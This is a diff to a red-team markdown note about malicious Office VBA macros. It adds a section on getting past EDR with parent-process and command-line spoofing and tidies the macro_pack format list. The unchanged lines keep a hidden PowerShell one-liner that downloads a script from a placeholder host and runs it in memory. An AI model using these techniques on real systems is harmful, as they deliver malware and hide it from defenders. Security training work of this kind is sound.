@@ -50,8 +50,9 @@ documentation](https://docs.microsoft.com/fr-fr/office/vba/api/excel.workbook).
 
 *Automatic macro example.*
 
-The following `VBA` code execute the `Test` macro upon opening in `MS Word`
-(with `AutoOpen`) and `MS Excel` (with `Workbook_Open`):
+The following `VBA` code execute the `Test` macro upon opening of the document
+containing the macro in `MS Word` (with `AutoOpen`) and `MS Excel`
+(with `Workbook_Open`):
 
 ```
 '<OS_COMMAND> basic example to download and execute in memory a PowerShell script from a webserver: cmd /c powershell.exe -NoP -NoExit -W Hidden -Exec Bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://<IP>/<PS_SCRIPT>').
@@ -81,11 +82,11 @@ The following output formats are supported by `macro_pack` (listed using
 `macro_pack.exe --listformats`):
   - Office documents:
     - Excel: `.xlsm`
-    - Excel97: `.xls`
+    - Excel 97: `.xls`
     - Word: `.docm`
-    - Word97: `.doc`
+    - Word 97: `.doc`
     - PowerPoint: `.pptm`
-    - MSProject: `.mpp`
+    - Microsoft Project: `.mpp`
     - Visio: `.vsdm`
     - Visio97: `.vsd`
     - Access: `.mdb`
@@ -123,6 +124,34 @@ macro_pack.exe -f "<VBA_TXT_FILE>" -o -G "<OUTPUT_FILE>"
 macro_pack.exe --run "<FILE>"
 ```
 
+###### VBA macro spoofing the parent process and command line
+
+Some `Endpoint Detection and Response (EDR)` products may rely on processes
+parent-child relationship to detect and eventually block malicious macro
+executions. Monitoring the process creation calls can for instance be used to
+detect `MS Office` applications spawning `cmd.exe` or `powershell.exe`.
+Processes' command line may also be scrutinized for malicious behavior.
+
+In order to bypass `EDR` products that may implement such detection and
+blocking mechanism, a process can be created with a spoofed parent-process and
+command line. The technique can be conducted as follow:
+
+  - creation of the process in a suspended state with a legitimate-looking
+    parent process (such as `explorer.exe`) and a seemingly harmless command
+    line. The `Win32`'s `CreateProcess` API indeed supports the specification
+    of the parent process (parameter of type `STARTUPINFOEX`).
+
+  - modification of the command line in the created process's
+    `Process Environment Block (PEB)` to the malicious command (which will the
+    one actually executed).
+
+  - resume of the process.
+
+`VBA` macros spawning a process with a spoofed parent and command line are
+available in the
+[`spoofing-office-macro`](https://github.com/christophetd/spoofing-office-macro)
+GitHub repository.
+
 --------------------------------------------------------------------------------
 
 ### References
@@ -134,3 +163,4 @@ https://www.excel-pratique.com/fr/vba/evenements_classeur
 https://github.com/christophetd/spoofing-office-macro
 https://www.youtube.com/watch?v=l8nkXCOYQC4
 https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/
+https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
